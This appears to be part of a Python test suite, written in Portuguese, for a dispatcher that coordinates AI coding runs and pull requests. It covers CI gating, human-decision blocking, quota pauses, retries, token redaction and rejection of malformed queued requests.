        self.assertEqual([t for t, _ in self.forja.decisoes].count(TITULO_SEM_PLANO), 1)
        self.assertEqual(self.forja.merges, [])
        fechados = [u for u, _ in self.forja.fechados]
        self.assertEqual(sorted(fechados), sorted(urls))
        self.assertTrue(all("inválido" in c for u, c in self.forja.fechados))

    def test_resposta_do_paulo_a_qualquer_decisao_zera_o_contador(self):
        d, rid = self.acordar_por_falha()
        outra = self.forja.abrir_decisao(REPO, "t", "c")
        d.estado["decisoes"].append({"url": outra, "motivo": "pergunta", "alvo": "x"})
        d._salvar()
        self.motor.definir_run(rid, estado="succeeded")
        d.ciclo()
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 1)
        self.forja.definir_decisao(outra, fechada=True, ultimo_comentario="resposta")
        d.ciclo()
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 0)

    def test_merge_do_orquestrador_zera_o_contador(self):
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="succeeded")
        d.ciclo()
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 1)
        rid = self.orquestrador()["runId"]
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")))
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 0)

    def test_bloqueio_segura_as_outras_acordadas_ate_a_resposta(self):
        d, _ = self.acordar_por_falha(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        self.terminar_sem_pr(d, 3)
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.motor.definir_plano("plano-2", "failed", [], falha="cancelado")
        for _ in range(3):
            d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)  # raia b falhou, mas o orquestrador está bloqueado
        url = [x for x in self.estado()["decisoes"] if x.get("tipo") == "bloqueio"][0]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="ok")
        d.ciclo()
        self.assertIn("Motivo: raia_falhou", self.runs(FABLE)[-1]["prompt"])
        self.assertIn('"raia": "b"', self.runs(FABLE)[-1]["prompt"])
        rid = self.orquestrador()["runId"]
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        d.ciclo()
        d.ciclo()
        self.assertIn("Motivo: resposta_paulo", self.runs(FABLE)[-1]["prompt"])


    def test_respostas_do_paulo_passam_pelo_bloqueio(self):
        d, _ = self.acordar_por_falha()
        outra = self.forja.abrir_decisao(REPO, "t", "c")
        d.estado["decisoes"].append({"url": outra, "motivo": "pergunta antiga", "alvo": "x"})
        d._salvar()
        self.terminar_sem_pr(d, 3)
        self.assertTrue(self.orquestrador()["bloqueio"])
        n = len(self.runs(FABLE))
        self.forja.definir_decisao(outra, fechada=True, ultimo_comentario="RESPOSTA-ANTIGA")
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), n + 1)
        self.assertIn("RESPOSTA-ANTIGA", self.runs(FABLE)[-1]["prompt"])
        self.assertTrue(self.orquestrador()["bloqueio"])  # o bloqueio continua até a issue dele
        # o run da resposta também termina sem PR: nada de plano_invalido enquanto bloqueado
        url = self.orquestrador()["bloqueio"]["url"]
        self.terminar_sem_pr(d, 3)
        self.assertEqual(len(self.runs(FABLE)), n + 1)
        self.assertEqual(self.orquestrador()["bloqueio"]["url"], url)  # a issue do bloqueio continua ligada
        self.assertFalse(any("3 vezes seguidas" in a for a in self.estado()["avisos"]))
        self.assertEqual([t for t, _ in self.forja.decisoes].count(TITULO_SEM_PLANO), 1)

    def test_duas_respostas_sem_resultado_durante_o_bloqueio_mantem_a_issue_ligada(self):
        """c07: as duas respostas passam pelo bloqueio e os dois runs ficam sem PR."""
        d, _ = self.acordar_por_falha()
        outras = [self.forja.abrir_decisao(REPO, "t%d" % i, "c") for i in range(2)]
        for i, u in enumerate(outras):
            d.estado["decisoes"].append({"url": u, "motivo": "pergunta %d" % i, "alvo": "x"})
        d._salvar()
        self.terminar_sem_pr(d, 3)
        url = self.orquestrador()["bloqueio"]["url"]
        for u in outras:
            self.forja.definir_decisao(u, fechada=True, ultimo_comentario="resposta")
        for _ in range(6):
            rid = self.orquestrador()["runId"]
            if rid:
                self.motor.definir_run(rid, estado="succeeded")
            d.ciclo()
            self.assertEqual(self.orquestrador()["bloqueio"]["url"], url)
        self.assertEqual([t for t, _ in self.forja.decisoes].count(TITULO_SEM_PLANO), 1)
        self.assertEqual(sum("Motivo: resposta_paulo" in r["prompt"] for r in self.runs(FABLE)), 2)

    def test_plano_invalido_leva_a_acordada_anterior(self):
        d = self.preparar_raia()
        url = self.forja.abrir_decisao(REPO, "t", "c")
        d.estado["decisoes"].append({"url": url, "motivo": "qual banco?", "alvo": "x"})
        d._salvar()
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="use Postgres 17")
        d.ciclo()
        self.motor.definir_run(self.orquestrador()["runId"], estado="succeeded")
        d.ciclo()
        ultimo = self.runs(FABLE)[-1]["prompt"]
        self.assertIn("Motivo: plano_invalido", ultimo)
        self.assertIn("use Postgres 17", ultimo)
        self.assertIn("acordadaAnterior", ultimo)


class TestesB_AcordadaPreservada(Base):
    def test_resposta_do_paulo_sobrevive_a_um_run_oom(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/pergunta.md"], pergunta="Postgres ou SQLite?")
        d.ciclo()
        url = self.estado()["decisoes"][0]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="RESPOSTA-DO-PAULO: Postgres")
        d.ciclo()
        rid2 = self.orquestrador()["runId"]
        self.assertEqual(self.orquestrador()["acordada"]["motivo"], "resposta_paulo")
        self.motor.definir_run(rid2, estado="failed", motivoFalha="oom_killed")
        d.ciclo()
        ultimo = self.runs(FABLE)[-1]["prompt"]
        self.assertNotEqual(self.orquestrador()["runId"], rid2)
        self.assertIn("Motivo: resposta_paulo", ultimo)
        self.assertIn("RESPOSTA-DO-PAULO: Postgres", ultimo)
        self.assertIn("Postgres ou SQLite?", ultimo)
        self.assertEqual(self.estado()["falhasAcordar"], 1)

    def test_nova_spec_e_refeita_com_a_spec_quando_o_run_falha(self):
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        d.iniciar(spec="docs/spec.md")
        rid = self.orquestrador()["runId"]
        self.motor.definir_run(rid, estado="failed", motivoFalha="timeout")
        d.ciclo()
        ultimo = self.runs(FABLE)[-1]["prompt"]
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.assertIn("Motivo: nova_spec", ultimo)
        self.assertIn('"spec": "docs/spec.md"', ultimo)
        self.assertNotIn("plano_invalido", ultimo)

    def test_tres_falhas_seguidas_pausam_com_uma_decisao_e_fechar_retoma(self):
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        d.iniciar(spec="docs/spec.md")
        for _ in range(5):
            rid = self.orquestrador()["runId"]
            if rid:
                self.motor.definir_run(rid, estado="cancelled")
            d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 3)
        self.assertTrue(self.estado()["pausado"])
        pausas = [x for x in self.forja.decisoes if x[0].startswith("[fábrica] despachante pausado")]
        self.assertEqual(len(pausas), 1)
        url = self.estado()["decisaoPausa"]["url"]
        self.forja.definir_decisao(url, fechada=True)
        d.ciclo()
        self.assertIsNone(self.estado()["pausado"])
        self.assertEqual(self.estado()["falhasAcordar"], 0)
        self.assertEqual(len(self.runs(FABLE)), 4)
        self.assertIn("Motivo: nova_spec", self.runs(FABLE)[-1]["prompt"])

    def test_estado_desconhecido_vira_failed_com_aviso_unico(self):
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="canceled")
        d.ciclo()
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.assertIn("Motivo: raia_falhou", self.runs(FABLE)[-1]["prompt"])
        avisos = [a for a in self.estado()["avisos"] if "'canceled'" in a]
        self.assertEqual(len(avisos), 1)

    def test_cota_no_orquestrador_pausa_e_guarda_a_acordada(self):
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="failed", motivoFalha="provider_error")
        self.motor.definir_texto(rid, "429 rate limit")
        d.ciclo()
        self.assertEqual(self.estado()["pausado"], "cota")
        (pendente,) = self.estado()["acordarPendentes"]
        self.assertEqual((pendente["motivo"], pendente["alvo"]), ("raia_falhou", "a"))


class TestesC_CiDoPrDoOrquestrador(Base):
    def test_pendente_espera_sem_concluir_e_mergeia_quando_fica_verde(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), ci="pendente")
        d.ciclo()
        self.instante += datetime.timedelta(minutes=90)
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(self.orquestrador()["runId"], rid)
        self.forja.definir_ci(REPO, H3, "verde")
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        self.assertIsNone(self.orquestrador()["runId"])

    def test_pendente_por_mais_de_2h_abre_decisao(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), ci="pendente")
        d.ciclo()
        self.instante += datetime.timedelta(hours=2, minutes=1)
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        ((_, corpo),) = self.forja.decisoes
        self.assertIn("CI pendente", corpo)
        self.assertIsNone(self.orquestrador()["runId"])

    def test_vermelho_e_ausente_obrigatorio_abrem_decisao_e_contam(self):
        for ci, config in (("vermelho", CONFIG), ("ausente", dict(CONFIG, ciObrigatorioNoPlano=True))):
            with self.subTest(ci=ci):
                self.setUp()
                self.config_padrao = config
                d, rid = self.acordar_por_falha()
                self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), ci=ci)
                d.ciclo()
                self.assertEqual(self.forja.merges, [])
                ((_, corpo),) = self.forja.decisoes
                self.assertIn("CI " + ci, corpo)
                self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 1)
                self.assertIsNone(self.orquestrador()["runId"])


class TestesC2_FalhaAoTratarOPr(Base):
    def test_ci_ilegivel_5_vezes_abre_decisao_e_conclui(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), ci=None)
        for _ in range(4):
            d.ciclo()
        self.assertEqual(self.orquestrador()["runId"], rid)
        self.assertEqual(self.forja.decisoes, [])
        d.ciclo()
        self.assertIsNone(self.orquestrador()["runId"])
        ((titulo, corpo),) = self.forja.decisoes
        self.assertIn("5 ciclos seguidos", corpo)
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 1)
        self.assertNotIn("falhasTratar", self.orquestrador())


class TestesD2_AvisoDePlanRunIlegivel(Base):
    def test_plan_run_ilegivel_avisa_uma_vez(self):
        self.motor = MotorLeituraFalha()
        d = self.preparar_raia(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        self.motor.falhando.add("plano-1")
        for _ in range(12):
            d.ciclo()
        avisos = [a for a in self.estado()["avisos"] if "plano-1" in a]
        self.assertEqual(len(avisos), 1)


class TestesD_WarrenInstavel(Base):
    def test_revisao_ilegivel_por_5_ciclos_vira_failed_e_e_refeita(self):
        self.motor = MotorLeituraFalha()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.falhando.add(rid)
        for _ in range(4):
            d.ciclo()
        self.assertEqual(self.estado()["seeds"]["s-1"]["revisaoRunId"], rid)
        d.ciclo()
        self.assertTrue(any(rid in a and "5 falhas" in a for a in self.estado()["avisos"]))
        self.assertEqual(len(self.runs(OPUS)), 2)
        self.assertNotEqual(self.estado()["seeds"]["s-1"]["revisaoRunId"], rid)

    def test_run_do_orquestrador_que_sumiu_conclui_e_reenfileira(self):
        d, rid = self.acordar_por_falha()
        del self.motor._runs[rid]
        d.ciclo()
        self.assertTrue(any(rid in a and "404" in a for a in self.estado()["avisos"]))
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.assertIn("Motivo: raia_falhou", self.runs(FABLE)[-1]["prompt"])

    def test_warren_inacessivel_por_5_ciclos_abre_uma_decisao_que_fecha_sozinha(self):
        self.motor = MotorLeituraFalha()
        d = self.preparar_raia()
        self.motor.todos = True
        for _ in range(4):
            d.ciclo()
        self.assertEqual(self.forja.decisoes, [])
        for _ in range(5):
            d.ciclo()
        titulos = [t for t, _ in self.forja.decisoes]
        self.assertEqual(titulos, ["[fábrica] Warren inacessível"])
        url = self.estado()["warrenFora"]["url"]
        self.motor.todos = False
        d.ciclo()
        d.ciclo()
        self.assertIsNone(self.estado()["warrenFora"].get("url"))
        self.assertTrue(self.forja.decisao(url)["fechada"])
        self.assertTrue(any("Warren voltou" in a for a in self.estado()["avisos"]))


class TestesE_OperacaoZeroManual(Base):
    def pausar_por_cota(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.definir_run(rid, estado="failed", motivoFalha="provider_error")
        self.motor.definir_texto(rid, "quota reached")
        d.ciclo()
        return d

    def test_e1_pausa_abre_uma_decisao_e_fechar_retoma(self):
        d = self.pausar_por_cota()
        d.ciclo()
        d.ciclo()
        pausas = [t for t, _ in self.forja.decisoes]
        self.assertEqual(pausas, ["[fábrica] despachante pausado: cota"])
        url = self.estado()["decisaoPausa"]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="")
        acoes = d.ciclo()
        self.assertIsNone(self.estado()["pausado"])
        self.assertIsNone(self.estado().get("decisaoPausa"))
        self.assertEqual([a["tipo"] for a in acoes], ["revisar"])

    def test_e1_retomar_por_fora_fecha_a_decisao_de_pausa(self):
        d = self.pausar_por_cota()
        url = self.estado()["decisaoPausa"]["url"]
        d.retomar()
        d.ciclo()
        self.assertTrue(self.forja.decisao(url)["fechada"])
        self.assertIn(("fechar_decisao", url), [(n, a.get("url")) for n, a in self.forja.chamadas])
        self.assertIsNone(self.estado().get("decisaoPausa"))

    def test_e2_com_a_trava_tomada_iniciar_spec_e_retomar_viram_pedidos(self):
        d = self.pausar_por_cota()
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        ambiente = {"FABRICA_RAIZ": str(self.raiz)}
        with despachante.travar(self.raiz):
            for argv in (["iniciar", "--spec", "docs/spec.md"], ["retomar"]):
                saida = io.StringIO()
                self.assertEqual(despachante.main(argv, ambiente=ambiente, construir=self.fail, saida=saida), 0)
                self.assertIn("pedido enfileirado", saida.getvalue())
            for argv in (["iniciar"], ["rodar"]):
                erro = io.StringIO()
                self.assertEqual(despachante.main(argv, ambiente=ambiente, construir=self.fail, erro=erro), 3)
        pedidos = sorted(p.name for p in (self.raiz / "entrada").iterdir())
        self.assertEqual(len(pedidos), 2)
        self.assertTrue(all(n.endswith(".json") and not n.startswith(".") for n in pedidos))
        self.assertEqual(self.runs(FABLE), [])
        d.ciclo()
        self.assertEqual(list((self.raiz / "entrada").iterdir()), [])
        self.assertIsNone(self.estado()["pausado"])
        self.assertEqual(len(self.runs(FABLE)), 1)
        self.assertIn("Motivo: nova_spec", self.runs(FABLE)[0]["prompt"])

    def test_e2_pedidos_invalidos_sao_descartados_com_aviso(self):
        d = self.preparar_raia()
        entrada = self.raiz / "entrada"
        entrada.mkdir()
        (entrada / "0001.json").write_text("{quebrado", encoding="utf-8")
        (entrada / "0002.json").write_text('{"comando": "apagar_tudo"}', encoding="utf-8")
        (entrada / "0003.json").write_text('{"comando": "iniciar", "spec": "docs/nao-existe.md"}', encoding="utf-8")
        (entrada / ".0004.json.1.tmp").write_text("{}", encoding="utf-8")
        d.ciclo()
        self.assertEqual([p.name for p in entrada.iterdir()], [".0004.json.1.tmp"])
        avisos = " | ".join(self.estado()["avisos"])
        self.assertIn("0001.json", avisos)
        self.assertIn("apagar_tudo", avisos)
        self.assertIn("docs/nao-existe.md", avisos)
        self.assertEqual(self.runs(FABLE), [])

    def test_corpo_de_issue_sai_sem_token(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/pergunta.md"], pergunta="Use o token %s?" % TOKEN)
        d.ciclo()
        ((titulo, corpo),) = self.forja.decisoes
        self.assertNotIn(TOKEN, titulo + corpo)
        self.assertIn("Use o token ***?", corpo)

    def test_e3_pr_da_pergunta_e_fechado_quando_respondida(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/pergunta.md"], pergunta="Qual banco?")
        d.ciclo()
        self.assertEqual(self.forja.fechados, [])
        url = self.estado()["decisoes"][0]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="Postgres")
        d.ciclo()
        d.ciclo()
        self.assertEqual([u for u, _ in self.forja.fechados], [PR_ORQ])
        self.assertFalse(self.forja.pr(PR_ORQ)["aberto"])

    def test_e3_pr_recusado_e_fechado_quando_substituido(self):
        d, rid = self.acordar_por_falha(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        self.pr_do_orquestrador(rid, [".fabrica/plano.json", ".fabrica/config.json"], plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        d.ciclo()  # guarda (a): vai para o Paulo e o PR fica aberto
        self.assertEqual(self.forja.fechados, [])
        self.motor.definir_plano("plano-2", "failed", [], falha="cancelado")
        d.ciclo()
        rid2 = self.orquestrador()["runId"]
        novo = "https://github.com/dono/cliente/pull/91"
        self.pr_do_orquestrador(
            rid2, [".fabrica/plano.json"], plano(raia("a"), raia("b", plano_seeds="pl-00bb")), head=H2, url=novo
        )
        d.ciclo()
        d.ciclo()
        self.assertEqual(self.forja.merges, [(novo, H2)])
        self.assertEqual([u for u, _ in self.forja.fechados], [PR_ORQ])
        self.assertIn(novo, self.forja.fechados[0][1])

    def test_e3_mergeado_por_fora_nao_e_fechado(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/pergunta.md"], pergunta="?")
        d.ciclo()
        self.forja.definir_pr(PR_ORQ, head_sha=H3, branch="warren/orq", arquivos=[".fabrica/pergunta.md"], aberto=False, mergeado=True)
        url = self.estado()["decisoes"][0]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="ok")
        d.ciclo()
        d.ciclo()
        self.assertEqual(self.forja.fechados, [])


class TestesH_ReplanejamentoDeRaiaEmExecucao(Base):
    def test_planoseeds_novo_cancela_o_plan_run_fecha_os_prs_e_redespacha(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.publicar(plano(raia("a", plano_seeds="pl-00a2")))
        acoes = d.ciclo()
        self.assertIn(("cancelar_plano", {"plan_run_id": "plano-1"}), self.motor.chamadas)
        self.assertEqual(acoes[0], {"tipo": "cancelar_raia", "raia": "a", "planoSeeds": "pl-00a2"})
        self.assertNotIn("s-1", self.estado()["seeds"])
        self.assertEqual(self.estado()["raias"]["a"]["seedsSubstituidas"], ["s-1"])
        self.assertEqual([x["plano_seeds"] for x in self.planos_despachados()], ["pl-000a", "pl-00a2"])
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")
        self.assertNotEqual(self.estado()["raias"]["a"]["planRunId"], "plano-1")
        d.ciclo()
        self.assertEqual([u for u, _ in self.forja.fechados], [PR])
        self.assertIn("replanejada", self.forja.fechados[0][1])
        self.assertEqual(self.forja.merges, [])

    def test_cancelamento_que_falha_tenta_de_novo_e_desiste_na_quinta(self):
        class MotorSemCancelar(motor.MotorFalso):
            def cancelar_plano(self, plan_run_id):
                self._registrar("cancelar_plano", plan_run_id=plan_run_id)
                raise RuntimeError("POST /plan-runs/x/cancel: HTTP 500")

        self.motor = MotorSemCancelar()
        d = self.preparar_raia()
        self.publicar(plano(raia("a", plano_seeds="pl-00a2")))
        for _ in range(4):
            d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["planRunId"], "plano-1")
        d.ciclo()
        self.assertEqual(len([c for c in self.motor.chamadas if c[0] == "cancelar_plano"]), 5)
        self.assertEqual(self.planos_despachados()[-1]["plano_seeds"], "pl-00a2")
        self.assertTrue(any("cancelar" in a for a in self.estado()["avisos"]))


class TestesI_Robustez(Base):
    def test_i1_retry_after_infinito_ou_enorme(self):
        for valor, espera in ((float("inf"), 900), (10**9, 900), (float("nan"), 30)):
            with self.subTest(valor=valor):
                self.setUp()
                self.publicar(plano(raia("a")))
                d = self.novo()
                d.iniciar()
                self.motor.lotar(valor)
                sonos = []
                d.rodar(intervalo=7, ciclos=2, dormir=sonos.append)
                self.assertEqual(sonos, [espera])
                self.assertNotIn("acaoEmCurso", self.estado())
                self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")

    def test_i2_queda_no_aguardar_humano_nao_reabre_a_issue(self):
        class ForjaQueCai(forja.ForjaFalsa):
            cair = True

            def abrir_decisao(self, repo, titulo, corpo):
                url = super().abrir_decisao(repo, titulo, corpo)
                if self.cair and "s-1" in titulo:
                    raise KeyboardInterrupt
                return url

        self.forja = ForjaQueCai()
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/1.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        with self.assertRaises(KeyboardInterrupt):
            d.ciclo()
        self.forja.cair = False
        outro = self.novo()
        outro.ciclo()
        outro.ciclo()
        self.assertEqual(len([t for t, _ in self.forja.decisoes if "s-1" in t]), 1)
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")
        self.assertEqual([x["alvo"] for x in self.estado()["decisoes"]], ["s-1"])
        self.assertEqual(self.estado()["decisoesPendentes"], [])

    def test_i3_queda_depois_do_merge_do_orquestrador_nao_abre_decisao(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")))
        with mock.patch.object(despachante.est, "concluir_orquestrador", side_effect=KeyboardInterrupt):
            with self.assertRaises(KeyboardInterrupt):
                d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        outro = self.novo()
        outro.ciclo()
        self.assertEqual(self.forja.decisoes, [])
        self.assertIsNone(self.orquestrador()["runId"])
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 0)
        self.assertFalse(any("fora do despachante" in a for a in self.estado()["avisos"]))
        self.assertIn("merge_do_orquestrador", [x.get("evento") for x in self.log() if x.get("recuperado")])

    def test_i3_pr_do_orquestrador_mergeado_por_fora_so_avisa(self):
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="succeeded")
        d.ciclo()  # sem PR: contador 1 e plano_invalido
        rid = self.orquestrador()["runId"]
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")))
        self.forja.definir_pr(PR_ORQ, head_sha=H3, branch="warren/orq", arquivos=[".fabrica/plano.json"], aberto=False, mergeado=True)
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(self.forja.decisoes, [])
        self.assertTrue(any("fora do despachante" in a for a in self.estado()["avisos"]))
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 1)  # neutro: nem zera nem soma

    def test_i3_pr_de_seed_mergeado_sem_aviso_de_fechado(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.forja.definir_pr(PR, head_sha=H1, branch="warren/s-1", arquivos=["src/a/x.ts"], aberto=False, mergeado=True)
        d.ciclo()
        self.assertFalse(any("fechado sem merge" in a for a in self.estado()["avisos"]))

    def test_i4_veredito_so_com_tres_campos_e_estado_em_json_estrito(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, ci="vermelho")
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        corpo = '{"sha": "%s", "resultado": "aprovado", "achados": [{"arquivo": "a", "motivo": "b", "linha": NaN}], "confianca": Infinity}' % H1
        self.motor.definir_run(rid, estado="succeeded")
        self.motor.definir_texto(rid, f"{prompts.INICIO_VEREDITO}\n{corpo}\n{prompts.FIM_VEREDITO}")
        d.ciclo()

        def recusar(c):
            raise ValueError(c)

        texto = (self.raiz / "estado.json").read_text(encoding="utf-8")
        estado_ = json.loads(texto, parse_constant=recusar)
        for v in (estado_["seeds"]["s-1"]["veredito"], estado_["seeds"]["s-1"]["vereditoAnterior"]):
            if v is not None:
                self.assertEqual(set(v), {"sha", "resultado", "achados"})
                self.assertEqual(v["achados"], [{"arquivo": "a", "motivo": "b"}])
        with self.assertRaises(ValueError):
            despachante.gravar_json_atomico(self.raiz / "x.json", {"n": float("nan")})

    def test_i4_plano_com_nan_e_recusado(self):
        d = self.preparar_raia()
        texto = json.dumps(plano(raia("a"), raia("b", plano_seeds="pl-000b"))).replace('"versao": 1', '"versao": NaN')
        self.publicar(texto)
        d.ciclo()
        self.assertEqual(len(json.loads((self.raiz / "plano.json").read_text(encoding="utf-8"))["raias"]), 1)

    def test_i5_rodar_e_iniciar_tomam_a_trava(self):
        d = self.preparar_raia()
        with despachante.travar(self.raiz):
            with self.assertRaises(despachante.OutroDespachante):
                d.rodar(intervalo=1, ciclos=1, dormir=lambda s: None)
            with self.assertRaises(despachante.OutroDespachante):
                d.iniciar()
        d.rodar(intervalo=1, ciclos=1, dormir=lambda s: None)

    def test_i6_redespacho_com_o_mesmo_pr_e_head_nao_revisa_de_novo(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.motor.definir_plano("plano-1", "running", [{"seedId": "s-1", "estado": "running", "runId": "r2"}])
        d.ciclo()
        self.motor.definir_plano("plano-1", "running", [{"seedId": "s-1", "estado": "pr_open", "runId": "r2", "prUrl": PR}])
        d.ciclo()
        self.assertEqual(len(self.runs(OPUS)), 1)
        self.assertEqual(len(self.verificacoes), 1)
        self.terminar_revisao(H1)
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR, H1)])

    def test_i6_head_novo_no_redespacho_revisa_de_novo(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.motor.definir_plano("plano-1", "running", [{"seedId": "s-1", "estado": "running", "runId": "r2"}])
        d.ciclo()
        self.motor.definir_plano("plano-1", "running", [{"seedId": "s-1", "estado": "pr_open", "runId": "r2", "prUrl": PR}])
        self.mover_head(H2)
        d.ciclo()
        self.assertEqual([r["prompt"].count(H2) > 0 for r in self.runs(OPUS)], [False, True])

    def test_i7_resposta_do_paulo_leva_o_alvo(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/1.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        url = self.estado()["decisoes"][0]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="ok")
        d.ciclo()
        self.assertIn('"alvo": "s-1"', self.runs(FABLE)[-1]["prompt"])

    def test_i8_avisos_limitados_e_erro_repetido_logado_uma_vez(self):
        d = self.preparar_raia()
        d.estado["avisos"] = ["aviso %d" % i for i in range(300)]
        d._salvar()
        self.assertEqual(len(self.estado()["avisos"]), 200)
        self.assertEqual(self.estado()["avisos"][-1], "aviso 299")
        self.abrir_pr(H1)
        self.forja._ci.clear()
        for _ in range(4):
            d.ciclo()
        erros = [x for x in self.log() if x.get("etapa") == "observar_pr"]
        self.assertEqual(len(erros), 1)

    def test_i9_spec_repetida_diz_spec_ja_iniciada(self):
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        ambiente = {"FABRICA_RAIZ": str(self.raiz)}
        saidas = []
        for _ in range(2):
            saida = io.StringIO()
            self.assertEqual(despachante.main(["iniciar", "--spec", "docs/spec.md"], ambiente=ambiente, construir=lambda a: self.novo(), saida=saida), 0)
            saidas.append(saida.getvalue())
        self.assertNotIn("spec já iniciada", saidas[0])
        self.assertIn("spec já iniciada", saidas[1])
        self.assertEqual(len(self.runs(FABLE)), 1)


# ---------------------------------------------------------------- rodada 2 (N1, I1–I5, J, K, L1–L9)


class MotorForaDoAr(motor.MotorFalso):
    """Com `fora`, toda chamada falha na camada de rede (o Warren caiu)."""

    fora = False

    def _talvez(self, nome, **argumentos):
        if self.fora:
            self._registrar(nome, **argumentos)
            raise motor.FalhaDeRede("GET /x: falha de rede (ConnectionRefusedError)")

    def run(self, run_id):
        self._talvez("run", run_id=run_id)
        return super().run(run_id)

    def plano(self, plan_run_id):
        self._talvez("plano", plan_run_id=plan_run_id)
        return super().plano(plan_run_id)

    def despachar_run(self, **argumentos):
        self._talvez("despachar_run", **argumentos)
        return super().despachar_run(**argumentos)

    def despachar_plano(self, **argumentos):
        self._talvez("despachar_plano", **argumentos)
        return super().despachar_plano(**argumentos)

    def ultimo_texto(self, run_id):
        self._talvez("ultimo_texto", run_id=run_id)
        return super().ultimo_texto(run_id)

    def modelo_efetivo(self, run_id):
        self._talvez("modelo_efetivo", run_id=run_id)
        return super().modelo_efetivo(run_id)


class TestesRodada2(Base):
    # ------------------------------------------------ I1
    def test_i1_queda_curta_do_warren_nao_escala_a_seed(self):
        self.motor = MotorForaDoAr()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.fora = True
        for _ in range(5):
            d.ciclo()
        self.motor.fora = False
        d.ciclo()
        seed = self.estado()["seeds"]["s-1"]
        self.assertEqual((seed["estado"], seed["revisaoRunId"], seed["pendenteHumano"]), ("em_revisao", rid, None))
        abertas = [t for u, t in zip(self.forja._decisoes, [t for t, _ in self.forja.decisoes]) if not self.forja._decisoes[u]["fechada"]]
        self.assertEqual(abertas, [])
